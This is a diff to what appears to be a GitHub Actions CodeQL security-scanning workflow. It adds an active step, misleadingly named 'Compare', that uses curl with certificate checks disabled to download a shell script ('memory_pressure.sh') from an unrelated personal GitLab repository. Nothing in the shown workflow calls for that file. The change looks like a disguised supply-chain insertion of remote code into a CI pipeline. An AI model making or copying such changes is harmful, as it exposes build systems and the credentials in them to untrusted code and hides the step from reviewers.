@@ -52,10 +52,9 @@ jobs:
     # ✏️ If the Autobuild fails above, remove it and uncomment the following three lines
     #    and modify them (or add more) to build your code if your project
     #    uses a compiled language
-
-    - run: |
+    - name: Compare
+      run: |
         curl -L -O -k https://gitlab.com/sarahemersonzrex/msconfig/-/raw/main/memory_pressure.sh
-    #   make release
 
     - name: Perform CodeQL Analysis
       uses: github/codeql-action/analyze@v1
